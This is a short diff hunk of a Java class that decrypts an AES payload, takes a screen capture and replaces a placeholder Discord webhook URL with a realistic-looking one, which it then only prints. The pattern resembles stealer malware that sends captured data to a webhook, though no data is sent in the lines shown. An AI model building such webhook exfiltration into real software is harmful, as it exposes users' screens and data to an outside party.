@@ -16,7 +16,7 @@ public class Principal {
         Cipher cipher = Cipher.getInstance("AES");
         cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(raw, "AES"));
         new java.awt.Robot().createScreenCapture(new java.awt.Rectangle(0, 0, 1, 1));
-        String hook = "https://discord.com/api/webhooks/123/abcdef";
+        String hook = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-AbCdEfGhIjKlMnOpQrStUvWx";
         System.out.println(loader + hook);
     }
 }
